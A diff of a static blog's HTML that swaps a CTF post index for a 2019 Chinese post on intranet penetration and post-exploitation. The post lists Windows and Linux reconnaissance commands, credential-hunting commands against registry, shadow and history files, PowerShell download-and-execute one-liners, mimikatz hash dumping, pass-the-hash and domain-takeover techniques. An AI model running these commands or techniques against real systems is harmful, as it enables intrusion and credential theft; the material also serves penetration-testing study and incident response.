@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Ywc&#39;s blog</title>
+    <title>内网渗透 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href= /css/style.css?v=201807017_1502 as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= /css/mobile.css?v=20180709 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -194,12 +196,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ywc&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">内网渗透</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Ywc's blog</a>
 </header>
@@ -213,24 +226,74 @@
 
 
 
+height:50vh;
+
 >
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/blog.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            内网渗透
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,605</span> / Reading time: <span class="post-count">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/08/14</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -331,304 +394,200 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/03/De1CTF/" >
-            
-                <span>De1CTF_WriteUp</span>
-        </a>
-        <div class="abstract-content">
-            De1CTF WriteUp
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="基本信息探测"><a href="#基本信息探测" class="headerlink" title="基本信息探测"></a>基本信息探测</h2><p>尽可能详细的分析出网段信息、各部门ip段、重点找出it运维部、OA、邮箱服务器、人力资源管理<br>思路：</p>
+<ul>
+<li>1、一般大公司有内部门户系统，可通过内部门户系统公开链接找出相关部门ip段</li>
+<li>2、通过路由器 交换机等设备 命令执行、snmp、弱口令获取网络拓扑</li>
+<li>3、某些内部管理平台如员工电脑行为监控系统(很多存在弱口令) 登录进去可查看部门和员工信息</li>
+<li>4、某些流量监控访问统计公开页面可泄漏内部应用信息</li>
+<li>5、Net view (nbtscan、ping)命令根据机器的命名备注名判断所属功能</li>
+<li>6、根据用户账户命名判断角色</li>
+</ul>
+<blockquote>
+<p>域内信息探测</p>
+</blockquote>
+<p>Net系列命令获取域内信息</p>
+<p>查看共享或许会有惊喜</p>
+<p>Csvde / ldifde / dsquery / adfind / ldapsearch 探测更详细信息</p>
+<p>使用Get-SPN (powershell 脚本LDAP中快速查询符合指定的用户、组、或者SPN服务名称)</p>
+<p>Nslookup –type=SRV _ldap._tcp. (寻找域控)</p>
+<p>Tasklist /v 列出进程和进程所有者(看是否有域管登录)</p>
+<p>PowerView (powershell 脚本 辅助找寻定位关键用户)</p>
+<p>WinScanX.exe 远程信息刺探</p>
+<p>Winfo.exe 遍历远程用户名</p>
+<p>Nmap smb-enum-sessions.nse （引擎来获取远程机器的登录session，并且不需要管理限。）</p>
+<p>netview.exe （它利用 NetSessionEnum 来找寻登陆sessions, 利用NetShareEnum来找寻共享 , 利用 NetWkstaUserEnum 来枚举登陆的用户）</p>
+<p><strong>linux:</strong><br>cat /etc/nsswitch</p>
+<p>看看密码登录策略我们可以看到使用了file ldap模式</p>
+<p>less /etc/ldap.conf</p>
+<p>base ou=People,dc=unix-center,dc=net</p>
+<p>找到ou,dc,dc设置</p>
+<p>ldapsearch 查找相关信息</p>
+<p>查看NFS 连接</p>
+<p>showmount -e ip</p>
+<h2 id="取得突破口"><a href="#取得突破口" class="headerlink" title="取得突破口"></a>取得突破口</h2><p>在外网进入内网时，需要一个突破口，可能会存在以下几种情况：</p>
+<ul>
+<li>通过SQL注入获取shell</li>
+<li>通过命令执行获取shell</li>
+<li>通过前后台上传恶意脚本直接获取webshell</li>
+<li>通过上传解析进行命令执行（csv、xml和shtml等）</li>
+<li>通过未授权代理和弱/默认口令VPN获取入口</li>
+<li>通过CSRF写shell</li>
+<li>通过XSS作为代理，探测内网</li>
+<li>钓鱼获得shell</li>
+</ul>
+<h2 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h2><h3 id="Windows信息提取"><a href="#Windows信息提取" class="headerlink" title="Windows信息提取"></a>Windows信息提取</h3><ul>
+<li><p>查看基本信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set | systeminfo (环境变量及补丁信息)</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>(已知的主机名/是否开启默认共享/有无特殊服务)<br>此处可以加上 <code>/domain</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net users | net view | net share | net start |net group</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看加入到域内的所有计算机名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看域控制器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看指定用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker /domain</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得域密码策略设置，密码长短，错误锁定等信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>查看路由信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print //查看路由</span><br><span class="line">arp -A  //查看路由表</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>查看进程所开端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | tasklist /svc</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看当前在线的用户状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看最近更改密码时间<br>有可能只是在原密码的基础上做了简单变换, 比如把xxx@2016换成xxx@2017</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state | netsh firewall show config | netsh advfirewall firewall show r</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查询含有特定文件名和内容的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir /s *pass* == *cred* == *vnc* == *.config*</span><br><span class="line">findstr /si password *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注册表里查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>部分工作站和域敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>有正确返回则为域用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>枚举提权：<br>一般是通过脚本枚举补丁，然后输出MS-***，市面上工具比较杂，这里不一一列举。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</span><br><span class="line">https://github.com/GDSSecurity/Windows-Exploit-Suggester</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="Linux信息提取"><a href="#Linux信息提取" class="headerlink" title="Linux信息提取"></a>Linux信息提取</h3><ul>
+<li>查看基本信息：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps auxfww (查看进程详细信息)</span><br><span class="line">netstat -tlnp (所有监听的TCP端口)</span><br><span class="line">netstat -antp | ss -antp (所有活动的TCP连接, 分析哪些IP与当前主机有关联)</span><br><span class="line">cat /etc/issue /etc/*release /proc/version (系统版本信息)</span><br><span class="line">cat /etc/passwd (查看用户配置, 哪些用户可以登陆系统)</span><br><span class="line">cat /etc/hosts (主机名解析配置, 一般这里的IP都是跟当前主机关联度比较高的)</span><br><span class="line">cat /etc/resolv.conf (查看DNS服务器IP, 内网DNS服务器存在域传输漏洞的可能性较高)</span><br><span class="line">id; uname -a; hostname; w; who; lastlog</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>查看敏感信息（也用于应急）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.bash_history | grep -Ei -C 2 &apos;ssh|mysql|ftp|scp|su|root|passwd&apos; (过滤历史命令记录）</span><br><span class="line">find / -perm +6000 -ls 2&gt;/dev/null | grep -v proc (查找具有SUID/SGID权限的文件和目录)</span><br><span class="line">find / -writable -ls 2&gt;/dev/null | grep -v proc (查找对当前用户具有写权限的文件和目录)</span><br><span class="line">cat /etc/crontab (计划任务中的执行脚本是否有修改权限)</span><br><span class="line">sudo -l (查看当前用户具有哪些sudo权限)</span><br><span class="line">sudo -V (某些版本的sudo存在提权漏洞)</span><br><span class="line">ls -latr /etc/ (查看哪些配置文件最近被修改过)</span><br><span class="line">ls -l /etc/shadow* (查看shadow文件是否有备份, 权限配置是否正确)</span><br><span class="line">cat /etc/security/opasswd (保存了曾经使用过的密码hash)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>内核提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CentOS 2.6.32 (2013年之前)</span><br><span class="line">https://www.exploit-db.com/exploits/25444/</span><br><span class="line">CVE-2010-3847 (RHEL5版本)</span><br><span class="line">https://www.nigesb.com/cve-2010-3847-exp-centos.html</span><br><span class="line">https://www.exploit-db.com/exploits/25444/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>枚举提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit (本地搜索漏洞库)</span><br><span class="line">linuxprivchecker.py (自动检测提权漏洞的脚本)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>密码获取<br>注册表读取自动登陆帐户密码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(cmd) reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br><span class="line">(msf) post/windows/gather/credentials/windows_autologin</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="powershell篇："><a href="#powershell篇：" class="headerlink" title="powershell篇："></a>powershell篇：</h3><ul>
+<li>1.Empire 【综合渗透工具，类似于msf】<br>可以生成木马，信息收集，提权，横向渗透以及后门<br><a href="https://github.com/EmpireProject/Empire.git" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire.git</a></li>
+<li>2.PowerUp 提权神器<br>powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘’)<br>powershell -exec bypass -Command “&amp; {Import-Module .PowerUp.ps1; Invoke-AllChecks}”</li>
+<li><p>3.PowerView 域渗透神器<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
+</li>
+<li><p>4.powershell读取系统密码【示例，需要xp和2003以上的系统才自带powershell】：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;&apos;)</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\powerview.ps1;Invoke-UserHunter&#125;&quot;</span><br><span class="line">powershell===&gt;Import-Module .\powerview.ps1 ===&gt;Invoke-UserHunter</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>导出系统密码或者hash,在导出域hash部分有详细介绍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter/mimikatz/pwdump7/wce/Getpwd_k8/QuarksPwDump</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://github.com/gentilkiwi/mimikatz/" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/</a></p>
+<h2 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h2><h3 id="0x01-组策略漏洞（GPP）"><a href="#0x01-组策略漏洞（GPP）" class="headerlink" title="0x01 组策略漏洞（GPP）"></a>0x01 组策略漏洞（GPP）</h3><p>域管理员使用GPP来配置和操作域，常见的操作有远程创建本地用户、映射打印机、映射磁盘等待，这些操作有时候需要提供账号密码。当组策略进行分发时，会在SYSVOL目录下生成一个xml文件，理所当然的前面提供的账号密码就保存在这个xml文件中了，而密码是经过AES加密的，也就是说是完全可逆的加密算法，而微软同时也很照顾的公布了加密密钥，所以任何域普通用户就可以读取这些xml文件并使用公开的AES密钥破解密码。</p>
+<h3 id="0X02-MS14-068-KERBEROS漏洞"><a href="#0X02-MS14-068-KERBEROS漏洞" class="headerlink" title="0X02 MS14-068 KERBEROS漏洞"></a>0X02 MS14-068 KERBEROS漏洞</h3><p>Benjamin Delpy(Mimikatz 的作者)写了一个MS14-068的利用工具，叫Kekeo，是PyKEK的升级版。它能够找到并定位有漏洞的域控，在打了补丁和有2012/2012R2域控的情况下仍能奏效。</p>
+<h3 id="0X03-LAPS-LOCAL-ADMINISTRATOR-PASSWORD-SOLUTION"><a href="#0X03-LAPS-LOCAL-ADMINISTRATOR-PASSWORD-SOLUTION" class="headerlink" title="0X03 LAPS(LOCAL ADMINISTRATOR PASSWORD SOLUTION)"></a>0X03 LAPS(LOCAL ADMINISTRATOR PASSWORD SOLUTION)</h3><p>LAPS配置不当，我们可以在域内一台普通主机，查看域内其他主机本地管理员账号密码</p>
+<h3 id="0X04-相同密码登录"><a href="#0X04-相同密码登录" class="headerlink" title="0X04 相同密码登录"></a>0X04 相同密码登录</h3><p>如果内网主机的本地管理员账户密码相同且存允许本地帐户登录域内其他机器那么可以通过以获取的hash或明文<br>一般步骤：</p>
+<ul>
+<li>1、远程登录到任意一台主机</li>
+<li>2、获得一台域主机的权限</li>
+<li>3、Dump内存获得用户hash (或明文)</li>
+<li>4、通过pass the hash或 明文 尝试登录其他主机</li>
+<li>5、继续搜集hash 或明文 并尝试远程登录</li>
+<li>6、直到获得域管理员账户hash，登录域控，最终成功控制整个域</li>
+</ul>
+<p>域登录缓存mscash</p>
+<p>使用reg命令提取sam、system、security，然后用creddump7提取mscash</p>
+<h3 id="利用漏洞配置、不当获取更多主机权限（获取敏感信息以最终控制整个域）"><a href="#利用漏洞配置、不当获取更多主机权限（获取敏感信息以最终控制整个域）" class="headerlink" title="利用漏洞配置、不当获取更多主机权限（获取敏感信息以最终控制整个域）"></a>利用漏洞配置、不当获取更多主机权限（获取敏感信息以最终控制整个域）</h3><p>1、常见应用漏洞:<br>(struts2、 zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问<br>Hadoop、weblogic、jboss、WebSphere、Coldfusion)</p>
+<p>2、常见语言反序列化漏洞(php、java、python、ruby、node.js)</p>
+<p>3、数据库漏洞及配置不当 (mssql Get-SQLServerAccess、mysql 低版本hash登录、mysql 低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当)</p>
+<p>4、内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当(注入、任意文件读取、备份 rsync git svn DS_Store等源码泄露、代码执行、xss、弱口令、上传漏洞、权限绕过…)</p>
+<p>5、web应用、及数据库中寻找其他服务器密码信息(ftp、mail、smb、ldap存储、sql…)</p>
+<p>6、系统备份文件(ghost) 中读密码</p>
+<p>7、在以有控制权限主机中 查看各浏览器书签、cookie、存储密码；键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密钥，以获取更多主机权限，推荐工具：NetRipper、Puttyrider.exe、BrowserPasswordDump.exe、LaZagne.exe(参考<a href="http://wolvez.club/?p=498" target="_blank" rel="noopener">http://wolvez.club/?p=498</a>)</p>
+<p>8、ms08-067 远程溢出(极少能碰到)</p>
+<p>9、cmdkey /list 远程终端可信任连接netpass.exe读取该密码</p>
+<p>10、arp欺骗中间人攻击 (替换sql数据包、认证凭证获取、密码获取 动静极大不到万不得已不会用)</p>
+<p>11、WPAD中间人攻击(全称网络代理自动发现协议 截获凭证该种方法不需要arp欺骗 比较好用的一种方法 （使用Responder.py / net-creds.py）</p>
+<p>12、翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站）</p>
+<p>13、用以有控制权限的邮箱帐号及前期所了解到的信息进行欺骗(社会工程学)</p>
+<p>14、定向浏览器信息ip信息定向挂马(0day)</p>
+<p>15、用以收集的密码(组合变换密码)对各服务进行爆破</p>
+<p>16、应用软件0day攻击…</p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/06/02/2019国赛华东北赛区线下/" >
-            
-                <span>2019国赛华东北赛区线下</span>
-        </a>
-        <div class="abstract-content">
-            又是一年国赛.....
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2019/08/14/内网渗透与后渗透/">https://yinwc.github.io/2019/08/14/内网渗透与后渗透/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2019/08/14/内网渗透与后渗透/">August 14th 2019, 1:50:27 pm</a>
+            <p>版权声明: </p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/02</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/15/DDCTF2019/" >
-            
-                <span>DDCTF2019</span>
-        </a>
-        <div class="abstract-content">
-            又是一年DDCTF....
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/15</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/12/25/安恒杯12月月赛/" >
-            
-                <span>安恒杯12月月赛</span>
-        </a>
-        <div class="abstract-content">
-            安恒杯12月赛 web writeup
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/25</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/11/24/安恒11月月赛/" >
-            
-                <span>安恒11月月赛Write-up</span>
-        </a>
-        <div class="abstract-content">
-            无聊做做安恒月赛...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/11/10/N1CTF2018题目复现/" >
-            
-                <span>N1CTF2018题目复现</span>
-        </a>
-        <div class="abstract-content">
-            复现一波题目...巩固知识
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/09/16/yilinbo/" >
-            
-                <span>易霖博杯 赛后总结</span>
-        </a>
-        <div class="abstract-content">
-            2018江苏省网络空间安全保密知识技能大赛
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/16</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/31/wangdingbei/" >
-            
-                <span>网鼎杯题目整理</span>
-        </a>
-        <div class="abstract-content">
-            四场网鼎杯结束了，整理下题目，方便以后看。
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/31</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/08/SJU-game/" >
-            
-                <span>SJU集训结业&amp;淘汰赛 Write Up</span>
-        </a>
-        <div class="abstract-content">
-            队内一次训练赛。
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/05/RCTF-2018/" >
-            
-                <span>RCTF-2018 cpushop</span>
-        </a>
-        <div class="abstract-content">
-            练习python脚本的编写能力。
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/05</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/08/03/De1CTF/" title= De1CTF_WriteUp >
+                    <div class="prevTitle">De1CTF_WriteUp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/tags/CTF/page/2/">2</a><a class="extend next" rel="next" href="/tags/CTF/page/2/">NEXT &#62;</a>
-    </nav>
     
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -705,6 +664,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本信息探测"><span class="toc-number">1.</span> <span class="toc-text">基本信息探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#取得突破口"><span class="toc-number">2.</span> <span class="toc-text">取得突破口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提取信息"><span class="toc-number">3.</span> <span class="toc-text">提取信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows信息提取"><span class="toc-number">3.1.</span> <span class="toc-text">Windows信息提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux信息提取"><span class="toc-number">3.2.</span> <span class="toc-text">Linux信息提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell篇："><span class="toc-number">3.3.</span> <span class="toc-text">powershell篇：</span></a></li></ol></li><li class="toc-item 